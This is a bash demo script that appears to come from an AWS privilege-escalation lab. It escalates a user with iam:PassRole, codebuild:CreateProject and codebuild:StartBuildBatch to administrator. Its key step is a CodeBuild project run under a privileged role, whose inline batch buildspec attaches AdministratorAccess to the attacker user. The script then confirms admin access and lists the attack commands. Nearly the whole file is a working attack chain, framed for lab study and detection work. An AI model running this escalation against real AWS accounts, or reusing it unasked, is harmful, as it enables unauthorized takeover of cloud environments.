#!/bin/bash

# Demo script for iam:PassRole + codebuild:CreateProject + codebuild:StartBuildBatch privilege escalation
# This script demonstrates how a user with CodeBuild permissions can escalate to admin


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
STARTING_USER="pl-prod-codebuild-004-to-admin-starting-user"
TARGET_ROLE="pl-prod-codebuild-004-to-admin-target-role"
CODEBUILD_PROJECT_NAME="pl-privesc-codebuild-batch-demo"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM PassRole + CodeBuild CreateProject + StartBuildBatch Privilege Escalation Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

# Step 1: Retrieve credentials and region from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../../../..  # Navigate to root of terraform project

# Get the module output using the grouped output pattern
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_admin_codebuild_004_iam_passrole_codebuild_createproject_codebuild_startbuildbatch.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials from the grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')

if [ "$STARTING_ACCESS_KEY_ID" == "null" ] || [ -z "$STARTING_ACCESS_KEY_ID" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

# Extract readonly credentials for observation/polling steps
READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Get region
AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")

if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access key for: $STARTING_USER"
echo "Access Key ID: ${STARTING_ACCESS_KEY_ID:0:10}..."
echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
echo "Region: $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# [EXPLOIT] Step 2: Verify starting user identity
echo -e "${YELLOW}Step 2: Configuring AWS CLI with starting user credentials${NC}"
use_starting_creds
export AWS_REGION=$AWS_REGION

echo "Using region: $AWS_REGION"

# Verify starting user identity
show_cmd "Attacker" "aws sts get-caller-identity --query 'Arn' --output text"
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$STARTING_USER"* ]]; then
    echo -e "${RED}Error: Not running as $STARTING_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified starting user identity${NC}\n"

# [OBSERVATION] Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --query 'Account' --output text"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# [EXPLOIT] Step 4: Verify we don't have admin permissions yet
echo -e "${YELLOW}Step 4: Verifying we don't have admin permissions yet${NC}"
use_starting_creds
echo "Attempting to list IAM users (should fail)..."
show_cmd "Attacker" "aws iam list-users --max-items 1"
if aws iam list-users --max-items 1 &> /dev/null; then
    echo -e "${RED}⚠ Unexpectedly have admin permissions already${NC}"
else
    echo -e "${GREEN}✓ Confirmed: Cannot list IAM users (as expected)${NC}"
fi
echo ""

# [EXPLOIT] Step 5: Prepare buildspec for CodeBuild project
echo -e "${YELLOW}Step 5: Preparing CodeBuild project with malicious buildspec${NC}"
echo "Creating buildspec that will attach AdministratorAccess policy to our user..."

# Create buildspec inline - this will be executed by CodeBuild with the target role's permissions
# Note: Batch builds require a batch: section with build-list
BUILDSPEC=$(cat <<'EOF'
version: 0.2
batch:
  fast-fail: false
  build-list:
    - identifier: privesc_build
      buildspec: |
        version: 0.2
        phases:
          build:
            commands:
              - echo "Starting privilege escalation..."
              - aws iam attach-user-policy --user-name pl-prod-codebuild-004-to-admin-starting-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
              - echo "Successfully attached AdministratorAccess policy!"
EOF
)

echo -e "${BLUE}Buildspec contents:${NC}"
echo "$BUILDSPEC"
echo -e "${GREEN}✓ Buildspec prepared${NC}\n"

# [EXPLOIT] Step 6: Create CodeBuild project with target role
use_starting_creds
echo -e "${YELLOW}Step 6: Creating CodeBuild project with privileged role${NC}"
echo "This is the privilege escalation vector - passing the target role to CodeBuild..."
TARGET_ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/${TARGET_ROLE}"
echo "Target Role ARN: $TARGET_ROLE_ARN"

# Create the CodeBuild project with batch buildspec
show_attack_cmd "Attacker" "aws codebuild create-project --region $AWS_REGION --name \"$CODEBUILD_PROJECT_NAME\" --source \"{\\\"type\\\":\\\"NO_SOURCE\\\",\\\"buildspec\\\":\\\"version: 0.2\\\\nbatch:\\\\n  fast-fail: false\\\\n  build-list:\\\\n    - identifier: privesc_build\\\\n      buildspec: |\\\\n        version: 0.2\\\\n        phases:\\\\n          build:\\\\n            commands:\\\\n              - echo \\\\\\\"Starting privilege escalation...\\\\\\\"\\\\n              - aws iam attach-user-policy --user-name ${STARTING_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\\\n              - echo \\\\\\\"Successfully attached AdministratorAccess policy!\\\\\\\"\\\"}\" --artifacts type=NO_ARTIFACTS --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL --service-role \"$TARGET_ROLE_ARN\" --build-batch-config \"{\\\"serviceRole\\\":\\\"${TARGET_ROLE_ARN}\\\"}\" --output json"
aws codebuild create-project \
    --region $AWS_REGION \
    --name "$CODEBUILD_PROJECT_NAME" \
    --source "{\"type\":\"NO_SOURCE\",\"buildspec\":\"version: 0.2\\nbatch:\\n  fast-fail: false\\n  build-list:\\n    - identifier: privesc_build\\n      buildspec: |\\n        version: 0.2\\n        phases:\\n          build:\\n            commands:\\n              - echo \\\"Starting privilege escalation...\\\"\\n              - aws iam attach-user-policy --user-name ${STARTING_USER} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess\\n              - echo \\\"Successfully attached AdministratorAccess policy!\\\"\"}" \
    --artifacts type=NO_ARTIFACTS \
    --environment type=LINUX_CONTAINER,image=aws/codebuild/standard:7.0,computeType=BUILD_GENERAL1_SMALL \
    --service-role "$TARGET_ROLE_ARN" \
    --build-batch-config "{\"serviceRole\":\"${TARGET_ROLE_ARN}\"}" \
    --output json > /dev/null

if [ $? -eq 0 ]; then
    echo -e "${GREEN}✓ Successfully created CodeBuild project: $CODEBUILD_PROJECT_NAME${NC}"
    echo "Project created with role: $TARGET_ROLE"
else
    echo -e "${RED}Error: Failed to create CodeBuild project${NC}"
    exit 1
fi
echo ""

# [EXPLOIT] Step 7: Start the build batch to execute the privilege escalation
use_starting_creds
echo -e "${YELLOW}Step 7: Starting CodeBuild build batch to execute privilege escalation${NC}"
echo "Starting build batch for project: $CODEBUILD_PROJECT_NAME"

show_attack_cmd "Attacker" "aws codebuild start-build-batch --region $AWS_REGION --project-name \"$CODEBUILD_PROJECT_NAME\" --output json"
BUILD_RESULT=$(aws codebuild start-build-batch \
    --region $AWS_REGION \
    --project-name "$CODEBUILD_PROJECT_NAME" \
    --output json)

if [ $? -eq 0 ]; then
    BUILD_BATCH_ID=$(echo "$BUILD_RESULT" | jq -r '.buildBatch.id')
    BUILD_BATCH_STATUS=$(echo "$BUILD_RESULT" | jq -r '.buildBatch.buildBatchStatus')
    echo "Build Batch ID: $BUILD_BATCH_ID"
    echo "Initial Status: $BUILD_BATCH_STATUS"
    echo -e "${GREEN}✓ Build batch started successfully${NC}"
else
    echo -e "${RED}Error: Failed to start build batch${NC}"
    exit 1
fi
echo ""

# [OBSERVATION] Step 8: Wait for the build batch to complete and policy to propagate
use_readonly_creds
echo -e "${YELLOW}Step 8: Waiting for build batch to complete and policy to propagate${NC}"
echo "This may take 2-3 minutes for the batch build orchestration and IAM changes..."

# Wait for build batch to complete
WAIT_TIME=0
MAX_WAIT=240  # Increased to 4 minutes for batch builds
while [ $WAIT_TIME -lt $MAX_WAIT ]; do
    # Get both batch status and individual build status
    show_cmd "ReadOnly" "aws codebuild batch-get-build-batches --region $AWS_REGION --ids \"$BUILD_BATCH_ID\" --output json"
    BATCH_INFO=$(aws codebuild batch-get-build-batches \
        --region $AWS_REGION \
        --ids "$BUILD_BATCH_ID" \
        --output json)

    BUILD_BATCH_STATUS=$(echo "$BATCH_INFO" | jq -r '.buildBatches[0].buildBatchStatus')

    # Try to get individual build status from the batch
    BUILD_IDS=$(echo "$BATCH_INFO" | jq -r '.buildBatches[0].buildGroups[0].identifier' 2>/dev/null || echo "")

    echo "Build batch status: $BUILD_BATCH_STATUS (waited ${WAIT_TIME}s)"

    if [ "$BUILD_BATCH_STATUS" = "SUCCEEDED" ]; then
        echo -e "${GREEN}✓ Build batch completed successfully${NC}"
        break
    elif [ "$BUILD_BATCH_STATUS" = "FAILED" ] || [ "$BUILD_BATCH_STATUS" = "FAULT" ] || [ "$BUILD_BATCH_STATUS" = "TIMED_OUT" ] || [ "$BUILD_BATCH_STATUS" = "STOPPED" ]; then
        echo -e "${RED}Build batch failed with status: $BUILD_BATCH_STATUS${NC}"
        echo "Check CodeBuild logs for details"
        exit 1
    fi

    sleep 10
    WAIT_TIME=$((WAIT_TIME + 10))
done

if [ $WAIT_TIME -ge $MAX_WAIT ]; then
    echo -e "${RED}Build batch did not complete within ${MAX_WAIT} seconds${NC}"
    echo -e "${YELLOW}Note: The build may have succeeded but batch orchestration is taking longer${NC}"
    echo "Checking if policy was attached anyway..."

    # Try to verify if the policy was attached despite timeout
    if aws iam list-attached-user-policies --user-name $STARTING_USER --query 'AttachedPolicies[?PolicyArn==`arn:aws:iam::aws:policy/AdministratorAccess`]' --output text 2>/dev/null | grep -q "AdministratorAccess"; then
        echo -e "${GREEN}✓ Policy was attached successfully despite timeout${NC}"
    else
        echo -e "${RED}Policy was not attached${NC}"
        exit 1
    fi
fi

# Additional wait for IAM propagation
echo ""
echo -e "${YELLOW}Waiting additional 15 seconds for IAM policy propagation...${NC}"
sleep 15
echo -e "${GREEN}✓ Policy should be propagated${NC}\n"

# [OBSERVATION] Step 9: Verify admin access
use_readonly_creds
echo -e "${YELLOW}Step 9: Verifying administrator access${NC}"
echo "Attempting to list IAM users..."

show_cmd "ReadOnly" "aws iam list-users --max-items 3 --output table"
if aws iam list-users --max-items 3 --output table; then
    echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
    echo -e "${GREEN}✓ ADMIN ACCESS CONFIRMED${NC}"
else
    echo -e "${RED}✗ Failed to list users${NC}"
    echo "Note: IAM policy changes can take a few minutes to fully propagate"
    echo "You may need to wait a bit longer and try again"
    exit 1
fi
echo ""

# Summary
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL!${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "\n${YELLOW}Attack Summary:${NC}"
echo "1. Started as: $STARTING_USER (with codebuild:CreateProject, codebuild:StartBuildBatch, iam:PassRole)"
echo "2. Created CodeBuild project with inline buildspec"
echo "3. Passed privileged role: $TARGET_ROLE to CodeBuild project"
echo "4. Started build batch execution with malicious buildspec"
echo "5. Buildspec attached AdministratorAccess policy to $STARTING_USER"
echo "6. Achieved: Administrator Access"

echo -e "\n${YELLOW}Attack Path:${NC}"
echo -e "  $STARTING_USER → (codebuild:CreateProject + iam:PassRole)"
echo -e "  → CodeBuild project with $TARGET_ROLE"
echo -e "  → (codebuild:StartBuildBatch) → Buildspec executes with admin permissions"
echo -e "  → Attach AdministratorAccess to $STARTING_USER → Admin"

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "\n${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi

echo -e "\n${YELLOW}Attack Artifacts:${NC}"
echo "- CodeBuild Project: $CODEBUILD_PROJECT_NAME"
echo "- Build Batch ID: $BUILD_BATCH_ID"
echo "- AdministratorAccess policy attached to: $STARTING_USER"

echo -e "\n${RED}⚠ Warning: The CodeBuild project and policy attachment remain${NC}"
echo -e "${RED}⚠ CodeBuild projects may incur charges${NC}"
echo ""
echo -e "${YELLOW}To clean up and restore the original state:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
